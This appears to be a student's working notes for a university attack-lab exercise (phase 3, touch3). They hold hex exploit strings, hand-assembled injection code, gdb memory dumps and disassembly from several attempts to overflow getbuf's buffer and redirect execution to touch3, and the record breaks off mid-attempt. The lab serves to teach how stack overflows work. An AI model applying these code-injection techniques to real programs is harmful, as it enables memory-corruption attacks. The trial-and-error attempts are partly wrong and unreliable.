@@ -1,0 +1,1013 @@
+Phase 3 / Level 3
+------------------
+
+66 66 66 66 66 66 66 66
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00 00
+c8 8d 61 55 00 00 00 00
+f2 b3 55 55 55 55 00 00
+11 66 55 55 55 55 00 00
+48 8b 3c 24            
+c7 04 87 66 30 34 34   
+48 8d 7f fc
+c7 04 87 33 32 33 31  
+48 8d 7f 04 
+48 8d 64 24 f0         
+c3
+
+
+// smthm mov addr to rdi but i lost the assembly part
+movl     $0x34343066, (%rdi, %rax, 4)
+lea      -0x4(%rdi), %rdi
+movl     $0x31333233, (%rdi, %rax, 4)
+lea      0x4(%rdi), %rdi
+lea      -0x10(%rsp), %rsp
+ret
+
+
+
+66 66 66 66 66 66 66 66
+33 32 33 31 66 30 34 34     // str
+2a 5f 55 55 55 55 00 00     // touch3
+c8 8d 61 55 00 00 00 00     // inj code addr
+f2 b3 55 55 55 55 00 00     // str store addr
+11 66 55 55 55 55 00 00
+48 8b 3c 24                 // load addr rdi
+c7 04 87 66 30 34 34        // 2 part cookie
+48 8d 7f fc
+c7 04 87 33 32 33 31        // 1 part cookie
+48 8d 7f 04                 // mov cookie addr back
+48 8d 64 24 f0              // rsp
+c3
+
+
+--------------------------------------------------------
+
+- involves code injection 
+- passing string as argument
+
+- getbuf should return to touch3 and pass a string representation of
+    cookie as arg
+
+notes:
+- include str representation of cookie in exploit string. it should 
+    consist of 8 hex digits (most to least significant) without leading "0x"
+- str in C is a sequence of bytes followed by null. "man ascii" to see byte
+    representation for characters needed
+- injection code should set %rdi to address of str
+- when functions hexmatch and strncmp are called, they push data onto the stack,
+    overwriting portions of memory that held the buffer used by getbuf (careful 
+    where cookie str is placed)
+
+
+--------------------------------------------------------    C functions
+
+
+// hexmatch
+// Compare string to hex represention of unsigned value
+int hexmatch(unsigned val, char *sval) {
+    char cbuf[110];
+
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+
+
+
+// touch3
+void touch3(char *sval) {
+    vlevel = 3;             /* Part of validation protocol */
+
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } 
+    else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+
+
+--------------------------------------------------------    
+
+
+// --------------- input format
+./hex2raw < strs.txt > exploits.txt         // hex from strs --> raw in exploits
+python3 str_to_hex.py                       // raw from strs --> hex in strs
+
+// --------------- run gdb
+gdb ctarget
+    run < exploits.txt -q
+
+// --------------- .gdbinit breakpoints
+nano ~/.gdbinit
+
+// --------------- 
+b *(getbuf+25)
+
+x/32xb $rsp
+
+watch $rip
+watch $rsp
+watch $rdi
+
+
+
+
+
+// --------------- buffer
+0x55618d98: [start of buffer]
+0x55618da0: 
+0x55618da8: [end of buffer]
+0x55618db0: [addr to ret in test]
+0x55618db8: 
+
+
+// --------------- function addresses and such
+getbuf = 0x0000555555555db1
+touch3 = 0x0000555555555f2a
+
+cookie = 0x3231f044
+
+
+--------------------------------------------------------    disass functions
+
+
+
+
+// getbuf (objdump)
+0000000000001db1 <getbuf>:
+    1db1:	f3 0f 1e fa          	endbr64 
+    1db5:	48 83 ec 18          	sub    $0x18,%rsp
+    1db9:	48 89 e7             	mov    %rsp,%rdi
+    1dbc:	e8 bb 02 00 00       	callq  207c <Gets>
+    1dc1:	b8 01 00 00 00       	mov    $0x1,%eax
+    1dc6:	48 83 c4 18          	add    $0x18,%rsp
+    1dca:	c3                   	retq   
+// getbuf (disass)
+Dump of assembler code for function getbuf:
+   0x0000555555555db1 <+0>:	endbr64 
+   0x0000555555555db5 <+4>:	sub    $0x18,%rsp
+   0x0000555555555db9 <+8>:	mov    %rsp,%rdi
+   0x0000555555555dbc <+11>:	callq  0x55555555607c <Gets>
+   0x0000555555555dc1 <+16>:	mov    $0x1,%eax
+   0x0000555555555dc6 <+21>:	add    $0x18,%rsp
+=> 0x0000555555555dca <+25>:	retq   
+End of assembler dump.
+
+
+
+
+
+// touch3
+0000000000001f2a <touch3>:
+    1f2a:	f3 0f 1e fa          	endbr64 
+    1f2e:	53                   	push   %rbx
+    1f2f:	48 89 fb             	mov    %rdi,%rbx
+    1f32:	c7 05 a0 54 00 00 03 	movl   $0x3,0x54a0(%rip)        # 73dc <vlevel>
+    1f39:	00 00 00 
+    1f3c:	48 89 fe             	mov    %rdi,%rsi
+    1f3f:	8b 3d 9f 54 00 00    	mov    0x549f(%rip),%edi        # 73e4 <cookie>
+    1f45:	e8 1f ff ff ff       	callq  1e69 <hexmatch>
+    1f4a:	85 c0                	test   %eax,%eax
+    1f4c:	74 2d                	je     1f7b <touch3+0x51>
+    1f4e:	48 89 da             	mov    %rbx,%rdx
+    1f51:	48 8d 35 b0 23 00 00 	lea    0x23b0(%rip),%rsi        # 4308 <_IO_stdin_used+0x308>
+    1f58:	bf 01 00 00 00       	mov    $0x1,%edi
+    1f5d:	b8 00 00 00 00       	mov    $0x0,%eax
+    1f62:	e8 49 f4 ff ff       	callq  13b0 <__printf_chk@plt>
+    1f67:	bf 03 00 00 00       	mov    $0x3,%edi
+    1f6c:	e8 99 03 00 00       	callq  230a <validate>
+    1f71:	bf 00 00 00 00       	mov    $0x0,%edi
+    1f76:	e8 85 f4 ff ff       	callq  1400 <exit@plt>
+    1f7b:	48 89 da             	mov    %rbx,%rdx
+    1f7e:	48 8d 35 ab 23 00 00 	lea    0x23ab(%rip),%rsi        # 4330 <_IO_stdin_used+0x330>
+    1f85:	bf 01 00 00 00       	mov    $0x1,%edi
+    1f8a:	b8 00 00 00 00       	mov    $0x0,%eax
+    1f8f:	e8 1c f4 ff ff       	callq  13b0 <__printf_chk@plt>
+    1f94:	bf 03 00 00 00       	mov    $0x3,%edi
+    1f99:	e8 40 04 00 00       	callq  23de <fail>
+    1f9e:	eb d1                	jmp    1f71 <touch3+0x47>
+// touch3
+Dump of assembler code for function touch3:
+   0x0000555555555f2a <+0>:	endbr64 
+   0x0000555555555f2e <+4>:	push   %rbx
+   0x0000555555555f2f <+5>:	mov    %rdi,%rbx
+   0x0000555555555f32 <+8>:	movl   $0x3,0x54a0(%rip)        # 0x55555555b3dc <vlevel>
+   0x0000555555555f3c <+18>:	mov    %rdi,%rsi
+   0x0000555555555f3f <+21>:	mov    0x549f(%rip),%edi        # 0x55555555b3e4 <cookie>
+   0x0000555555555f45 <+27>:	callq  0x555555555e69 <hexmatch>
+   0x0000555555555f4a <+32>:	test   %eax,%eax
+   0x0000555555555f4c <+34>:	je     0x555555555f7b <touch3+81>
+   0x0000555555555f4e <+36>:	mov    %rbx,%rdx
+   0x0000555555555f51 <+39>:	lea    0x23b0(%rip),%rsi        # 0x555555558308
+   0x0000555555555f58 <+46>:	mov    $0x1,%edi
+   0x0000555555555f5d <+51>:	mov    $0x0,%eax
+   0x0000555555555f62 <+56>:	callq  0x5555555553b0 <__printf_chk@plt>
+   0x0000555555555f67 <+61>:	mov    $0x3,%edi
+   0x0000555555555f6c <+66>:	callq  0x55555555630a <validate>
+   0x0000555555555f71 <+71>:	mov    $0x0,%edi
+   0x0000555555555f76 <+76>:	callq  0x555555555400 <exit@plt>
+   0x0000555555555f7b <+81>:	mov    %rbx,%rdx
+   0x0000555555555f7e <+84>:	lea    0x23ab(%rip),%rsi        # 0x555555558330
+   0x0000555555555f85 <+91>:	mov    $0x1,%edi
+   0x0000555555555f8a <+96>:	mov    $0x0,%eax
+   0x0000555555555f8f <+101>:	callq  0x5555555553b0 <__printf_chk@plt>
+   0x0000555555555f94 <+106>:	mov    $0x3,%edi
+   0x0000555555555f99 <+111>:	callq  0x5555555563de <fail>
+   0x0000555555555f9e <+116>:	jmp    0x555555555f71 <touch3+71>
+End of assembler dump.
+
+
+
+
+
+// hexmatch
+Dump of assembler code for function hexmatch:
+   0x0000555555555e69 <+0>:	endbr64 
+   0x0000555555555e6d <+4>:	push   %rbp
+   0x0000555555555e6e <+5>:	mov    %rsp,%rbp
+   0x0000555555555e71 <+8>:	push   %r14
+   0x0000555555555e73 <+10>:	push   %r13
+   0x0000555555555e75 <+12>:	push   %r12
+   0x0000555555555e77 <+14>:	push   %rbx
+   0x0000555555555e78 <+15>:	and    $0xfffffffffffffff0,%rsp
+   0x0000555555555e7c <+19>:	add    $0xffffffffffffff80,%rsp
+   0x0000555555555e80 <+23>:	mov    %edi,%r12d
+   0x0000555555555e83 <+26>:	mov    %rsi,%rbx
+   0x0000555555555e86 <+29>:	mov    $0x28,%r13d
+   0x0000555555555e8c <+35>:	mov    %fs:0x0(%r13),%rax
+   0x0000555555555e91 <+40>:	mov    %rax,0x78(%rsp)
+   0x0000555555555e96 <+45>:	xor    %eax,%eax
+   0x0000555555555e98 <+47>:	callq  0x555555555380 <random@plt>
+   0x0000555555555e9d <+52>:	mov    %rax,%rcx
+   0x0000555555555ea0 <+55>:	movabs $0xa3d70a3d70a3d70b,%rdx
+   0x0000555555555eaa <+65>:	imul   %rdx
+   0x0000555555555ead <+68>:	add    %rcx,%rdx
+   0x0000555555555eb0 <+71>:	sar    $0x6,%rdx
+   0x0000555555555eb4 <+75>:	mov    %rcx,%rax
+   0x0000555555555eb7 <+78>:	sar    $0x3f,%rax
+   0x0000555555555ebb <+82>:	sub    %rax,%rdx
+   0x0000555555555ebe <+85>:	lea    (%rdx,%rdx,4),%rax
+   0x0000555555555ec2 <+89>:	lea    (%rax,%rax,4),%rax
+   0x0000555555555ec6 <+93>:	shl    $0x2,%rax
+   0x0000555555555eca <+97>:	sub    %rax,%rcx
+   0x0000555555555ecd <+100>:	lea    (%rsp,%rcx,1),%r14
+   0x0000555555555ed1 <+104>:	mov    %r12d,%r8d
+   0x0000555555555ed4 <+107>:	lea    0x23d6(%rip),%rcx        # 0x5555555582b1
+   0x0000555555555edb <+114>:	mov    $0xffffffffffffffff,%rdx
+   0x0000555555555ee2 <+121>:	mov    $0x1,%esi
+   0x0000555555555ee7 <+126>:	mov    %r14,%rdi
+   0x0000555555555eea <+129>:	mov    $0x0,%eax
+   0x0000555555555eef <+134>:	callq  0x555555555440 <__sprintf_chk@plt>
+   0x0000555555555ef4 <+139>:	mov    $0x9,%edx
+   0x0000555555555ef9 <+144>:	mov    %r14,%rsi
+   0x0000555555555efc <+147>:	mov    %rbx,%rdi
+   0x0000555555555eff <+150>:	callq  0x555555555280 <strncmp@plt>
+   0x0000555555555f04 <+155>:	test   %eax,%eax
+   0x0000555555555f06 <+157>:	sete   %al
+   0x0000555555555f09 <+160>:	mov    0x78(%rsp),%rbx
+   0x0000555555555f0e <+165>:	xor    %fs:0x0(%r13),%rbx
+   0x0000555555555f13 <+170>:	jne    0x555555555f25 <hexmatch+188>
+   0x0000555555555f15 <+172>:	movzbl %al,%eax
+   0x0000555555555f18 <+175>:	lea    -0x20(%rbp),%rsp
+   0x0000555555555f1c <+179>:	pop    %rbx
+   0x0000555555555f1d <+180>:	pop    %r12
+   0x0000555555555f1f <+182>:	pop    %r13
+   0x0000555555555f21 <+184>:	pop    %r14
+   0x0000555555555f23 <+186>:	pop    %rbp
+   0x0000555555555f24 <+187>:	retq   
+   0x0000555555555f25 <+188>:	callq  0x5555555552c0 <__stack_chk_fail@plt>
+
+
+
+--------------------------------------------------------
+
+
+input includes:
+- str representation of cookie
+- set %rdi to that^
+- addr of injected code
+- ret touch3
+- addr of touch3
+
+
+need to find:
+- where hexmatch and strncmp dont overwrite
+
+
+0x55618d98: [start of buffer]
+0x55618da0: 
+0x55618da8: [end of buffer]
+0x55618db0: [addr to ret in test]
+0x55618db8: 
+
+
+// injection code ish
+mov     [addr of cookie str], %rdi
+add     0x10, %rsp
+ret
+
+
+// buffer  and a bit after
+0x55618d98:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618da0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618da8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // end of buffer
+0x55618db0:	0xb2	0x5f	0x55	0x55	0x55	0x55	0x00	0x00    // getbuf ret calls
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00    // are we not allowed to mess w this
+0x55618dc8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // hmmm
+0x55618dd0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x55618dd8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+
+
+
+// cookie
+0x3231f044     // 3 2 3 1 f 0 4 4
+33 32 33 31 66 30 34 34 00
+
+
+
+// maybe
+0x55618d98:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // mov cookie addr, %rdi
+0x55618da0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // movb first char cookie str, (%rdi) 
+0x55618da8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // add 0x10, %rsp   /   ret
+0x55618db0:	0xb2	0x5f	0x55	0x55	0x55	0x55	0x00	0x00    // addr injection code
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // cookie except first byte
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00    // keep this bc idk what it does and therefore dont like it
+0x55618dc8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // addr of touch3
+
+
+//--------
+
+
+// assembly injection code
+48 8b 3c 25 b7 8d 61 55 	mov    0x55618db7,%rdi      /* addr of cookie str */
+c6 07 03             	    movb   $0x3,(%rdi)          /* mov fist char of cookie str */
+48 03 24 25 10 00 00 00	    add    0x10,%rsp            /* set %rsp to addr of touch3 */
+c3                   	    ret                
+
+
+// input should look when stored
+0x55618d98:	[mov cookie addr --> %rdi]
+0x55618da0: [movb (cookie first char), (%rdi)]
+0x55618da3:	[set %rsp --> addr touch3]
+0x55618dab: [ret]
+0x55618dac: [00...]
+
+0x55618db0:	[addr inject code / start of buffer]
+0x55618db8:	[cookie str (except first byte)]
+0x55618dc0:	[whatever this addr is but im not gonna mess w it]
+0x55618dc8:	[addr of touch3]
+
+
+
+
+// --------------------------------------------------------------------- test 1
+0x55618d98:	48 8b 3c 25 b7 8d 61 55         /* mov cookie --> %rdi */
+0x55618da0: c6 07 03                        /* mov first char of cookie */
+0x55618da3:	48 03 24 25 10 00 00 00	        /* mov touch3 --> %rsp */
+0x55618dab: c3                              /* ret */
+0x55618dac: 00 00 00 00
+
+0x55618db0:	98 8d 61 55 00 00 00 00         /* addr inject code */
+0x55618db8:	32 33 31 66 30 34 34 00         /* cookie str except first char */
+0x55618dc0:	11 66 55 55 55 55 00 00         /* some addr that is not my concern */
+0x55618dc8:	2a 5f 55 55 55 55 00 00         /* addr touch3 */
+
+
+
+// %rip shoud follow something like
+<getbuf+25> ret (injection code)
+<0x55618d98> [%rdi = 0x55618db7] (set arg)
+<0x55618da0> [0x55618db7 = 0x33] (fix cookie str)
+<0x55618da3> [%rsp = 0x55618dc8] (set ret)
+<0x55618dab> ret (touch3)
+<touch3+0> [and hopefully does not fuck up]
+
+//----------- input
+48 8b 3c 25 b7 8d 61 55
+c6 07 03 48 03 24 25 10
+00 00 00 c3 00 00 00 00
+98 8d 61 55 00 00 00 00
+32 33 31 66 30 34 34 00
+11 66 55 55 55 55 00 00
+2a 5f 55 55 55 55 00 00
+
+
+// ------------------
+
+// ok i have realized my mistake lemme try this again
+0x55618db7 183 - 0x55618d98 152 = 31 0x1f
+
+
+48 8d 3d 1f 00 00 00 	    lea    0x1f(%rip),%rdi
+c6 07 03             	    movb   $0x3,(%rdi)
+48 03 24 25 10 00 00 00 	add    0x10,%rsp
+c3                   	    ret 
+
+
+
+
+
+// ------------------------------------------------------- test 2
+
+0x55618d98:	48 8d 3d 1f 00 00 00            /* lea cookie --> %rdi */
+0x55618d9f: c6 07 03                        /* mov first char of cookie */
+0x55618da2:	48 03 24 25 10 00 00 00	        /* mov addr touch3 --> %rsp */
+0x55618daa: c3                              /* ret */
+0x55618dab: 00 00 00 00 00                      /* fill rest of buffer */
+
+0x55618db0:	98 8d 61 55 00 00 00 00         /* addr inject code */
+0x55618db8:	32 33 31 66 30 34 34 00         /* cookie str except first char */
+0x55618dc0:	11 66 55 55 55 55 00 00             /* some addr that is not my concern */
+0x55618dc8:	2a 5f 55 55 55 55 00 00         /* addr touch3 */
+
+
+
+// %rip shoud follow something like
+<getbuf+25> ret (injection code)
+<0x55618d98> [%rdi = 0x55618db7] (set arg)
+<0x55618d9f> [0x55618db7 = 0x33] (fix cookie str)
+<0x55618da2> [%rsp = 0x55618dc8] (set ret)
+<0x55618dab> ret (touch3)
+<touch3+0> [and hopefully does not fuck up]
+
+//----------- input
+48 8d 3d 1f 00 00 00 c6 
+07 03 48 03 24 25 10 00 
+00 00 c3 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+32 33 31 66 30 34 34 00
+11 66 55 55 55 55 00 00
+2a 5f 55 55 55 55 00 00
+
+
+
+// ------------------------------------------------------- test 3
+
+// ------------------
+// ok need to adjust
+
+48 8d 7c 24 ff       	lea    -0x1(%rsp),%rdi
+c6 07 33             	movb   $0x33,(%rdi)
+48 03 24 25 10 00 00 00	add    0x10,%rsp
+c3                   	ret  
+
+
+0x55618d98:	48 8d 7c 24 ff                  /* lea cookie --> %rdi */
+0x55618d9d: c6 07 33                        /* mov first char of cookie */
+0x55618da0:	48 03 24 25 10 00 00 00	        /* mov addr touch3 --> %rsp */
+0x55618da8: c3                              /* ret */
+0x55618da9: 00 00 00 00 00 00 00                /* fill rest of buffer */
+
+0x55618db0:	98 8d 61 55 00 00 00 00         /* addr inject code */
+0x55618db8:	32 33 31 66 30 34 34 00         /* cookie str except first char */
+0x55618dc0:	11 66 55 55 55 55 00 00             /* some addr that is not my concern */
+0x55618dc8:	2a 5f 55 55 55 55 00 00         /* addr touch3 */
+
+
+
+// %rip shoud follow something like
+<getbuf+25> ret (injection code)
+<0x55618d98> [%rdi = 0x55618db7] (set arg)
+<0x55618d9d> [0x55618db7 = 0x33] (fix cookie str)
+<0x55618da0> [%rsp = 0x55618dc8] (set ret)
+<0x55618da9> ret (touch3)
+<touch3+0> [and hopefully even gets to this point]
+
+
+
+
+
+// ------------------------------------------------------- test 4
+
+// well i find this rude
+// tis the add 0x10, %rsp
+// actually nvm thats on me i should have caught that whoops
+
+
+
+48 8d 7c 24 ff       	lea    -0x1(%rsp),%rdi
+c6 07 33             	movb   $0x33,(%rdi)
+48 8b 64 24 10       	mov    0x10(%rsp),%rsp
+c3                   	ret  
+
+
+0x55618d98:	48 8d 7c 24 ff                  /* lea cookie --> %rdi */
+0x55618d9d: c6 07 33                        /* mov first char of cookie */
+0x55618da0:	48 8b 64 24 10      	        /* mov addr touch3 --> %rsp */
+0x55618da5: c3                              /* ret */
+0x55618da6: 00 00 00 00 00 00 00 00 00 00       /* fill rest of buffer */
+
+0x55618db0:	98 8d 61 55 00 00 00 00         /* addr inject code */
+0x55618db8:	32 33 31 66 30 34 34 00         /* cookie str except first char */
+0x55618dc0:	11 66 55 55 55 55 00 00             /* some addr that is not my concern */
+0x55618dc8:	2a 5f 55 55 55 55 00 00         /* addr touch3 */
+
+
+
+// %rip shoud follow something like
+<getbuf+25> ret (injection code)
+<0x55618d98> [%rdi = 0x55618db7] (set arg)
+<0x55618d9d> [0x55618db7 = 0x33] (fix cookie str)
+<0x55618da0> [%rsp = 0x55618dc8] (set ret)
+<0x55618da5> ret (touch3)
+<touch3+0> [and hopefully even gets to this point]
+
+
+
+//----------- input
+48 8d 7c 24 ff
+c6 07 33 
+48 8b 64 24 10 
+c3 
+00 00 00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+32 33 31 66 30 34 34 00
+11 66 55 55 55 55 00 00
+2a 5f 55 55 55 55 00 00
+
+
+
+(gdb) x/64xb 0x55618d98
+0x55618d98:	0x48	0x8d	0x7c	0x24	0xff	0xc6	0x07	0x33
+0x55618da0:	0x48	0x8b	0x64	0x24	0x10	0xc3	0x00	0x00
+0x55618da8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618db0:	0x98	0x8d	0x61	0x55	0x00	0x00	0x00	0x00
+0x55618db8:	0x32	0x33	0x31	0x66	0x30	0x34	0x34	0x00
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00
+0x55618dc8:	0x2a	0x5f	0x55	0x55	0x55	0x55	0x00	0x00
+0x55618dd0:	0x00	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+
+
+
+// ------------------------------------------------------- test 5
+// fuck it made it to ret but segmentation fault why
+// rsp is correct mmmmwwwwwwwww wait maybe not
+
+
+48 8d 7c 24 ff       	lea    -0x1(%rsp),%rdi
+c6 07 33             	movb   $0x33,(%rdi)
+48 8d 64 24 10       	lea    0x10(%rsp),%rsp
+c3                   	ret   
+
+//----------- input
+48 8d 7c 24 ff
+c6 07 33 
+48 8d 64 24 10 
+c3 
+00 00 00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+32 33 31 66 30 34 34 00
+11 66 55 55 55 55 00 00
+2a 5f 55 55 55 55 00 00
+
+// ------------------------------------------------------- test 5 
+// k well it makes it to touch3 and exits normal w fail so
+//hmmmmmmmm
+
+48 8d 7c 24 ff c6 07 34 
+48 8d 64 24 10 c3 00 00 
+00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+34 30 66 31 33 32 33 00
+11 66 55 55 55 55 00 00
+2a 5f 55 55 55 55 00 00
+
+// ---- break at touch 3
+// it it overwriting my shit thats rude
+// im just going to assume buffer starts at the value i think it does
+
+// alright nvm but ik touch1 and two arent being used so can i just
+
+// no that seems like itd not work but wait
+
+b *(main+405)
+18fd:	8b 15 e1 5a 00 00    	mov    0x5ae1(%rip),%edx        # 73e4 <cookie>
+0x55555555B3DE   
+
+
+0x55618db8
+48 8d 3c 24          	lea    (%rsp),%rdi
+c7 07 33 32 33 31    	movl   $0x31333233,(%rdi)
+c7 47 04 66 30 34 34 	movl   $0x34343066,0x4(%rdi)
+48 8d 64 24 10       	lea    0x10(%rsp),%rsp
+c3                   	ret
+
+48 8d 7c 24 ff       	lea    -0x1(%rsp),%rdi
+c6 07 33             	movb   $0x33,(%rdi)
+48 8d 64 24 10       	lea    0x10(%rsp),%rsp
+c3                   	ret  
+
+48 8d 3c 24          	lea   0x8(%rsp),%rdi                // mov cookie addr
+c7 07 33 32 33 31    	mov   (%rsp, %eax,16),(%rdi)            // mov first part cooki
+c7 47 04 66 30 34 34 	mov   (%rsp, %eax,20),0x4(%rdi)         // moov 2 part cookie
+c3                   	ret
+
+0x55555555b400 - 0x555555555dff = 0x5601
+
+lea    0x5601(%rdx),%rdi
+
+
+0x55618db8
+0x55555555b3ee = put cooki
+
+
+---------------------------------------------------------------------------
+touch2 = 0x0000555555555e03
+
+
+lea     0x10(%rsp), %rdi
+mov     (%rsp), %rdi
+lea     0x8(%rsp), %rsp
+ret
+48 8d 7c 24 10       	lea    0x10(%rsp),%rdi      /* load addr of cookie --> %rdi */
+48 8b 3c 24          	mov    (%rsp),%rdi          /* mov cookie str --> %rdi */
+48 8d 64 24 08       	lea    0x8(%rsp),%rsp       /* load touch3 addr --> %rsp */
+c3                   	ret    
+
+98 8d 61 55 00 00 00 00  // inj code
+34 34 30 66 31 33 32 33  // cookie
+2a 5f 55 55 55 55 00 00  // touch3    +0x54c4
+ee b3 55 55 55 55 00 00  // put cookie
+
+
+48 8d 7c 24 10
+48 8b 3c 24
+48 8d 64 24 08
+c3
+00 00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+34 34 30 66 31 33 32 33
+2a 5f 55 55 55 55 00 00
+ee b3 55 55 55 55 00 00
+
+
+
+// ------------------------------------------------------- test 6
+
+
+lea     0x10(%rsp), %rdi
+mov     (%rsp), %rdi
+lea     -0x10(%rsp), %rsp
+ret
+
+0x55618d98: 48 8d 7c 24 10              // load rdi
+0x55618d9d: 48 8b 3c 24                 // mov cookie
+0x55618da1: 48 8d 64 24 f0              // load rsp
+0x55618da6: c3                          // ret
+0x55618da7: 66                          // random char doesnt matter
+0x55618da8: 2a 5f 55 55 55 55 00 00     // addr touch3 (endl of buffer)
+0x55618db0: 98 8d 61 55 00 00 00 00     // addr inject code above
+0x55618db8: 33 32 33 31 66 30 34 34     // cookie str
+0x55618dc0: 11 66 55 55 55 55 00 00     // some addr i leave alone
+0x55618dc8: ee b3 55 55 55 55 00 00     // addr to put cookie
+
+
+touch3 addr =       0x55618da8      (0x555555555f2a)
+inject code addr =  0x55618d98
+this =              (0x555555556611)
+cookie addr =       0x55618dc8      (0x55555555b3ee)
+cookie =            (0x3231f044)
+cookie str =        (33 32 33 31 66 30 34 34)
+
+
+// %rip shoud follow something like
+<getbuf+25> ret (injection code)
+<0x55618d98> [%rdi = 0x55618dc8] (load %rdi)
+<0x55618d9d> [0x555555555f2a = ] (mov cookie str)
+<0x55618da1> [%rsp = 0x55618da8] (load %rsp)
+<0x55618da6> ret (touch3)
+<touch3+0> [and hopefully even gets to this point]
+
+
+// ---- input:
+48 8d 7c 24 10
+48 8b 3c 24
+48 8d 64 24 f0
+c3
+66
+2a 5f 55 55 55 55 00 00 
+98 8d 61 55 00 00 00 00
+33 32 33 31 66 30 34 34
+11 66 55 55 55 55 00 00
+ee b3 55 55 55 55 00 00
+
+
+
+//---------
+rip = 0x55618d98
+rsp = 0x55618db8
+rdi = 
+
+rip = 0x55618d9d
+rsp = 
+rdi = 1432456648    // 0x55618DC8
+
+rip = 0x55618da1
+rsp = 
+rdi = 3761684804231442995   // huh
+
+rip = 0x55618da6
+rsp = 0x55618da8
+rdi = 
+
+-- touch3
+rip = 0x555555555f2a
+rsp = 0x55618db0
+rdi = 0x3434306631333233    // that aint right
+
+
+// ------------------------------------------------------- test 6
+// need to load addr at %rsp --> %rdi (not just %rsp)
+
+lea     (%rsp), %rdi
+mov     (%rsp, %rax, 8), %rdi
+lea     0x10(%rsp), %rsp
+ret
+
+0x55618d98: 48 8d 3c 24                 // load rdi
+0x55618d9c: 48 8b 3c c4                 // mov cookie
+0x55618da0: 48 8d 64 24 10              // load rsp
+0x55618da5: c3                          // ret
+0x55618da6: 66 66 66 66 66 66 66 66                      // random char doesnt matter
+
+0x55618db0: 98 8d 61 55 00 00 00 00     // addr inject code above
+0x55618db8: ee b3 55 55 55 55 00 00     // addr to put cookie
+0x55618dc0: 33 32 33 31 66 30 34 34     // cookie str
+0x55618dc8: 2a 5f 55 55 55 55 00        // addr touch3 (endl of buffer)
+
+48 8d 3c 24
+48 8b 3c 24
+48 8d 64 24 10
+c3
+00 00 00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+
+//---------
+rip = 0x55618d98
+rsp = 0x55618db8
+rdi = 
+
+rip = 0x55618d9c
+rsp = 
+rdi = 1432456632    // 0x55618DB8  :|
+
+rip = 0x55618da0
+rsp = 
+rdi = 93824992261102   // huh
+
+rip = 0x55618da5
+rsp = 0x55618dc8
+rdi = 
+
+-- touch3
+rip = 0x555555555f2a
+rsp = 0x55618dd0
+rdi = 0x55555555b3ee    // that not right
+
+
+
+(gdb) x/64xb 0x55555555b3ee
+0x55555555b3ee:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55555555b3f6:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55555555b3fe:	0x00	0x00	0x34	0x38	0x20	0x38	0x44	0x20
+0x55555555b406 <gets_buf+6>:	0x33	0x43	0x20	0x32	0x34	0x20	0x34	0x38
+0x55555555b40e <gets_buf+14>:	0x20	0x38	0x42	0x20	0x33	0x43	0x20	0x32
+0x55555555b416 <gets_buf+22>:	0x34	0x20	0x34	0x38	0x20	0x38	0x44	0x20
+0x55555555b41e <gets_buf+30>:	0x36	0x34	0x20	0x32	0x34	0x20	0x31	0x30
+0x55555555b426 <gets_buf+38>:	0x20	0x43	0x33	0x20	0x30	0x30	0x20	0x30
+
+
+// ------------------------------------------------------- test 7
+// need fix addr and things for cookie
+
+
+
+mov     (%rsp, %rax, 8), %rdi
+lea     0x8(%rsp), %rsp
+mov     %rsp, (%rdi,%eax,4)
+lea     0x8(%rsp), %rsp
+ret
+
+
+
+48 8b 3c 24             // keep this
+48 8d 64 24 10
+c3 
+00 00 00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+-----------------------
+mov     %rsi, (%rdi, %rax, 8)
+lea     0x10(%rsp), %rsp
+ret
+
+48 8b 3c 24
+48 89 34 c7
+48 8d 64 24 10
+c3 
+00 00 00 00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+---------------------
+
+lea     0x8(%rsp), %rsp
+mov     %rsi, (%rdi, %rax, 8)
+lea     0x8(%rsp), %rsp
+ret
+
+48 8b 3c 24
+48 8d 64 24 08
+48 89 34 c7
+48 8d 64 24 08
+c3 
+00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+---------------------
+
+
+mov     %rsp, (%rsp, %rax, 8)
+lea     0x10(%rsp), %rsp
+ret
+
+48 8b 3c 24
